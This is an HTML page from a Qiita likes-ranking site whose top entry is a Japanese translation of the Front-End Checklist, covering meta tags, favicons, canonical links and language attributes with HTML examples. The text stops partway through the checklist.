<html>
	<head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-110075493-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-110075493-1');
</script>
<!-- Google AdSense -->
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-6168511236629369",
    enable_page_level_ads: true
  });
</script>

		<meta charset="UTF-8" />
		<title>Qiita Ranking</title>
		<link rel="stylesheet" type="text/css" href="qranking.css">
	</head>
	<body>
<div class="headerContainer">
<h1>Qiitaいいね数ランキング (100位まで)</h1>
<h2>対象記事件数: 222,355件 (2011/09/16～2017/11/23)</h2>
</div><!--class="headerContainer"-->
<p>ランキングは毎日更新します。</p>
<p><i><img width="16" height="16" src="thumb-up-120px.png" /></i>が同じ値の場合は投稿日時の新しいものが上位としています。</p>
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">1位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>1453</kbd>
		<a target="_blank" href="https://qiita.com/miya0001/items/8fff46c201bf9eaeba4a">フロントエンドチェックリスト（日本語訳）</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-23<br />15:50:24</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/32458.html">miya0001</a>(47件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/32458/profile-images/1473685905">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[CSS]</b> <b>[JavaScript]</b> <b>[HTML5]</b> <b>[SEO]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><a href="https://travis-ci.org/miya0001/Front-End-Checklist" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/5c3ed10028a494f15cbc4e1824a1c8f1974cef76/68747470733a2f2f7472617669732d63692e6f72672f6d697961303030312f46726f6e742d456e642d436865636b6c6973742e7376673f6272616e63683d6d6173746572" alt="Build Status" data-canonical-src="https://travis-ci.org/miya0001/Front-End-Checklist.svg?branch=master"></a></p>

<p>GitHubで公開されているフロントエンドチェックリストというドキュメントが、網羅されている内容が幅広く便利そうだったので、日本語に翻訳しました。</p>

<p><a href="https://github.com/thedaviddias/Front-End-Checklist" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/thedaviddias/Front-End-Checklist</a></p>

<p>日本語版は、以下のGitHubリポジトリにあります。GitHub側と自動的に連携するようにしておりますので、誤訳や誤りなどがあれば GitHub のプルリクエストまたは Issue で報告していただけると幸いです。</p>

<ul>
<li><a href="https://github.com/miya0001/Front-End-Checklist" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/miya0001/Front-End-Checklist</a></li>
<li><a href="https://github.com/miya0001/Front-End-Checklist/blob/master/README-ja.md" rel="nofollow noopener" target="_blank">日本語版への貢献方法</a></li>
</ul>

<p>最終更新日時: 2017-11-19 03:50:47+09:00 (<a href="https://github.com/miya0001/Front-End-Checklist/compare/master...thedaviddias:master" rel="nofollow noopener" target="_blank">未翻訳</a>)</p>

<hr>

<p><a href="http://frontendchecklist.com" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/e35b3463ef615fb071f92158dcef0fa4b78d4536/68747470733a2f2f6769746875622e636f6d2f7468656461766964646961732f46726f6e742d456e642d436865636b6c6973742f626c6f622f6d61737465722f7372632f696d672f62616e6e6572732f66726f6e742d656e642d636865636b6c6973742d62616e6e65722d6c696768742e6a70673f7261773d74727565" alt="Front-End Checklist Logo" data-canonical-src="https://github.com/thedaviddias/Front-End-Checklist/blob/master/src/img/banners/front-end-checklist-banner-light.jpg?raw=true"></a></p>

<h2><a href="http://frontendchecklist.com" rel="nofollow noopener" target="_blank">Front-End Checklist</a></h2>

<p>
  <em>The Front-End Checklist is an exhaustive list of all elements you need to have / to test before launching your site / HTML page to production.</em>
</p>

<p><a href="https://gitter.im/Front-End-Checklist/Lobby?utm_source=badge&amp;utm_medium=badge&amp;utm_campaign=pr-badge&amp;utm_content=badge" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/fd05d03695c87c16c7cda5935985b546ad549b3a/68747470733a2f2f6261646765732e6769747465722e696d2f46726f6e742d456e642d436865636b6c6973742f4c6f6262792e737667" alt="Join the chat at https://gitter.im/Front-End-Checklist/Lobby" data-canonical-src="https://badges.gitter.im/Front-End-Checklist/Lobby.svg"></a><br>
<a href="https://github.com/thedaviddias/Front-End-Checklist/" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/8a3f975efc47ae3df93bcec7455b42b43e74a3dc/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f46726f6e74254532253830253931456e645f436865636b6c6973742d666f6c6c6f7765642d627269676874677265656e2e737667" alt="Front‑End_Checklist followed" data-canonical-src="https://img.shields.io/badge/Front%E2%80%91End_Checklist-followed-brightgreen.svg"></a><br>
<a href="#backers"><img src="https://camo.qiitausercontent.com/29f139abe01fe3d17cab238f5ef41ccec4311550/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f6261636b6572732f62616467652e737667" alt="Backers on Open Collective" data-canonical-src="https://opencollective.com/front-end-checklist/backers/badge.svg"></a> <a href="#sponsors"><img src="https://camo.qiitausercontent.com/14b11439cb73ded3abb64e4bb9a050a3bae432aa/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f66726f6e742d656e642d636865636b6c6973742f73706f6e736f72732f62616467652e737667" alt="Sponsors on Open Collective" data-canonical-src="https://opencollective.com/front-end-checklist/sponsors/badge.svg"></a><br>
<a href="https://github.com/thedaviddias/Front-End-Checklist/graphs/contributors" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/269d8e2c830899da3e09a869a60226e36413cd24/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6e7472696275746f72732f7468656461766964646961732f46726f6e742d456e642d436865636b6c6973742e737667" alt="Contributors" data-canonical-src="https://img.shields.io/github/contributors/thedaviddias/Front-End-Checklist.svg"></a><br>
<a href="https://stackshare.io/thedaviddias/front-end-checklist" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/f90148daaac99b5b10f73ffad3863109a6bc9f40/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f746563682d737461636b2d3036393066612e7376673f7374796c653d666c6174" alt="StackShare" data-canonical-src="https://img.shields.io/badge/tech-stack-0690fa.svg?style=flat"></a><br>
<a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/5c04a10daeb5aae95712d91a6002b2aa4ad00c06/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d4343302d677265656e2e737667" alt="CC0" data-canonical-src="https://img.shields.io/badge/license-CC0-green.svg"></a></p>

<p><strong>フロントエンドチェックリスト</strong>は、みなさんがウェブサイトや HTML ページを本番環境で公開する前に確認するべきあらゆる項目を網羅したリストです。</p>

<p>これは、フロントエンド開発者たちの数年に及ぶ経験にもとづいており、さらに他のオープンソースのチェックリストの内容も追加されています。</p>

<p><a rel="nofollow noopener" href="https://app.codesponsor.io/link/HxqChNNHFKFaMpEpEikk4EM4/thedaviddias/Front-End-Checklist" target="_blank"><br>
  <img alt="Sponsor" width="888" height="68" src="https://camo.qiitausercontent.com/cacd3ea858706bb5d36c1d8405352746ef5d384e/68747470733a2f2f6170702e636f646573706f6e736f722e696f2f656d6265642f48787143684e4e48464b46614d70457045696b6b34454d342f7468656461766964646961732f46726f6e742d456e642d436865636b6c6973742e737667" data-canonical-src="https://app.codesponsor.io/embed/HxqChNNHFKFaMpEpEikk4EM4/thedaviddias/Front-End-Checklist.svg"><br>
</a></p>

<h2>
<span id="目次" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1"><i class="fa fa-link"></i></a>目次</h2>

<ol>
<li><strong><a href="#head">Head</a></strong></li>
<li><strong><a href="#html">HTML</a></strong></li>
<li><strong><a href="#%E3%82%A6%E3%82%A7%E3%83%96%E3%83%95%E3%82%A9%E3%83%B3%E3%83%88">ウェブフォント</a></strong></li>
<li><strong><a href="#css">CSS</a></strong></li>
<li><strong><a href="#%E7%94%BB%E5%83%8F">画像</a></strong></li>
<li><strong><a href="#javascript">JavaScript</a></strong></li>
<li><strong><a href="#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3">セキュリティ</a></strong></li>
<li><strong><a href="#%E3%83%91%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%B3%E3%82%B9-1">パフォーマンス</a></strong></li>
<li><strong><a href="#%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B7%E3%83%93%E3%83%AA%E3%83%86%E3%82%A3">アクセシビリティ</a></strong></li>
<li><strong><a href="#seo">SEO</a></strong></li>
</ol>

<h2>
<span id="利用方法" class="fragment"></span><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>利用方法</h2>

<p><strong>フロントエンドチェックリスト</strong>のすべての項目は大半のプロジェクトで必要とされていますが、いくつかの項目は省略できますし、必須でもありません。（たとえば管理用のウェブアプリケーションの場合は、RSSは必要ないでしょう。）私たちは三段階で重要度を評価しています。</p>

<ul>
<li>
<a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> は、<strong>推奨</strong>を意味していますが、個別のシチュエーションによっては省略することも可能です。</li>
<li>
<a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> は、<strong>強く推奨</strong>を意味していますが、ごく稀なケースでは必須ではなく省略することも可能です。いくつかの項目においては省略することによってパフォーマンスやSEOで悪影響がある可能性があります。</li>
<li>
<a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> は、<strong>必須</strong>を意味しており、いかなる理由でも省略することはできません。これらを省略することで機能が不完全だったり、アクセシビリティやSEOの問題が発生することがあります。テストの優先順位はまずこれらの項目からはじめるべきです。</li>
</ul>

<p>チェックリストのいくつかのリソースでは、絵文字を使ってコンテンツの種類を理解したり、ヘルプを見つけやすいようにしています。</p>

<ul>
<li>📖: ドキュメンテーションまたは文章</li>
<li>🛠: オンラインツール / テストツール</li>
<li>📹: メディアまたはビデオコンテンツ</li>
</ul>

<hr>

<h2>
<span id="head" class="fragment"></span><a href="#head"><i class="fa fa-link"></i></a>Head</h2>

<blockquote>
<p><strong>備考:</strong> HTMLドキュメントの <code>&lt;head&gt;</code> については、<a href="https://github.com/joshbuchea/HEAD" rel="nofollow noopener" target="_blank">すべてのリストがこちらにあります</a>。</p>
</blockquote>

<h3>
<span id="meta-タグ" class="fragment"></span><a href="#meta-%E3%82%BF%E3%82%B0"><i class="fa fa-link"></i></a>Meta タグ</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>DOCTYPE宣言:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> Doctype が HTML5 であり、すべての HTML ページの先頭にあること。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="cp">&lt;!doctype html&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖 <a href="https://www.w3.org/TR/html5/syntax.html#determining-the-character-encoding" rel="nofollow noopener" target="_blank">Determining the character encoding - HTML5 W3C</a>
</li>
</ul>
</blockquote>

<p><em>次の3つの Meta タグ（Charset、X-UA、Viewport）は、<code>&lt;head&gt;</code>の先頭にあるべきです。</em></p>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>文字コード:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> 文字コード (UTF-8) が正しく宣言されている。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
</pre></div></div>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>X-UA-Compatible:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> Meta タグ X-UA-Compatible が存在している。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"x-ua-compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"ie=edge"</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<p>📖 <a href="https://msdn.microsoft.com/en-us/library/jj676915(v=vs.85).aspx" rel="nofollow noopener" target="_blank">レガシードキュメントモードの設定 (Internet Explorer)</a></p>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Viewport:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> viewport が正しく宣言されている。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="p">&gt;</span>
</pre></div></div>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Title:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> title が全てのページで使用されている。（SEO: Google は、タイトルで使用される文字幅をピクセルで計算し、472から482ピクセルで切り詰めます。平均的な文字数は半角で55文字となります。）</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Page Title less than 55 characters<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/title" rel="nofollow noopener" target="_blank">Title - HTML - MDN</a>
</li>
<li>🛠 <a href="https://www.sistrix.com/serp-snippet-generator/" rel="nofollow noopener" target="_blank">SERP Snippet Generator</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Description:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> meta description が提供されており、これはユニークでありなおかつ150文字以下である。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"description"</span> <span class="na">content</span><span class="o">=</span><span class="s">"Description of the page less than 150 characters"</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖<a href="https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/The_head_metadata_in_HTML#Adding_an_author_and_description" rel="nofollow noopener" target="_blank">Meta Description - HTML - MDN</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Favicons:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> それぞれの favicon が作られており正しく表示されている。もし、<code>favicon.ico</code> しかない場合、それはあなたのサイトのルートに設置されている。通常はマークアップは必要ない。しかしながら、以下の例のようにリンクをはることがまだ有効である。昨今では、<strong>PNG フォーマット</strong> が  <code>.ico</code> フォーマットよりも推奨されている。（サイズ: 32x32px）</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"icon"</span> <span class="na">type</span><span class="o">=</span><span class="s">"image/x-icon"</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://example.com/favicon.ico"</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"icon"</span> <span class="na">type</span><span class="o">=</span><span class="s">"image/png"</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://example.com/favicon.png"</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>🛠 <a href="https://www.favicon-generator.org/" rel="nofollow noopener" target="_blank">Favicon Generator</a>
</li>
<li>🛠 <a href="https://realfavicongenerator.net/" rel="nofollow noopener" target="_blank">RealFaviconGenerator</a>
</li>
<li>📖 <a href="https://github.com/audreyr/favicon-cheat-sheet" rel="nofollow noopener" target="_blank">Favicon Cheat Sheet</a>
</li>
<li>📖 <a href="https://css-tricks.com/favicon-quiz/" rel="nofollow noopener" target="_blank">Favicons, Touch Icons, Tile Icons, etc. Which Do You Need? - CSS Tricks</a>
</li>
<li>📖 <a href="https://caniuse.com/#feat=link-icon-png" rel="nofollow noopener" target="_blank">PNG favicons - caniuse</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Apple Touch Icon:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> apple-mobile-web-app-capable がある。 <em>(すくなくとも 200x200pxのAppleアイコンファイルを作成すれば、必要な全ての寸法をサポートする。)</em>
</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"apple-touch-icon"</span> <span class="na">href</span><span class="o">=</span><span class="s">"/custom-icon.png"</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖 <a href="https://developer.apple.com/library/content/documentation/AppleApplications/Reference/SafariWebContent/ConfiguringWebApplications/ConfiguringWebApplications.html" rel="nofollow noopener" target="_blank">Configuring Web Applications</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Windows カスタムタイル:</strong><a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> Windows カスタムタイルが提供されリンクされている。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"msapplication-config"</span> <span class="na">content</span><span class="o">=</span><span class="s">"browserconfig.xml"</span> <span class="p">/&gt;</span>
</pre></div></div>

<p>browserconfig.xml の必要最小限の構成は以下:</p>

<div class="code-frame" data-lang="xml"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;browserconfig&gt;</span>
   <span class="nt">&lt;msapplication&gt;</span>
     <span class="nt">&lt;tile&gt;</span>
        <span class="nt">&lt;square70x70logo</span> <span class="na">src=</span><span class="s">"small.png"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;square150x150logo</span> <span class="na">src=</span><span class="s">"medium.png"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;wide310x150logo</span> <span class="na">src=</span><span class="s">"wide.png"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;square310x310logo</span> <span class="na">src=</span><span class="s">"large.png"</span><span class="nt">/&gt;</span>
     <span class="nt">&lt;/tile&gt;</span>
   <span class="nt">&lt;/msapplication&gt;</span>
<span class="nt">&lt;/browserconfig&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖 <a href="https://msdn.microsoft.com/en-us/library/dn320426(v=vs.85).aspx" rel="nofollow noopener" target="_blank">Browser configuration schema reference</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Canonical:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 重複したコンテンツを避けるために <code>rel="canonical"</code> を使用している。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"canonical"</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://example.com/2017/09/a-new-article-to-red.html"</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖 <a href="https://support.google.com/webmasters/answer/139066?hl=en" rel="nofollow noopener" target="_blank">Use canonical URLs - Search Console Help - Google Support</a>
</li>
<li>📖 <a href="https://webmasters.googleblog.com/2013/04/5-common-mistakes-with-relcanonical.html" rel="nofollow noopener" target="_blank">5 common mistakes with rel=canonical - Google Webmaster Blog</a>
</li>
</ul>
</blockquote>

<h3>
<span id="html-タグ" class="fragment"></span><a href="#html-%E3%82%BF%E3%82%B0"><i class="fa fa-link"></i></a>HTML タグ</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Language 属性:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> あなたのサイトの言語を指定するための <code>lang</code> 属性が記述されている。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
</pre></div></div>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Direction 属性:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 書字方向を指定するための <code>dir</code> 属性が <code>&lt;html&gt;</code> タグに指定されている。（これは他の HTML タグ上でも使用可能である。）</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span> <span class="na">dir</span><span class="o">=</span><span class="s">"rtl"</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/dir" rel="nofollow noopener" target="_blank">dir - HTML - MDN</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>代替言語:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> あなたのサイトの言語タグが既述されており、現在のページに言語が関連づけられている。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"alternate"</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://es.example.com/"</span> <span class="na">hreflang</span><span class="o">=</span><span class="s">"es"</span><span class="p">&gt;</span>
</pre></div></div>

<ul>
<li class="task-list-item">
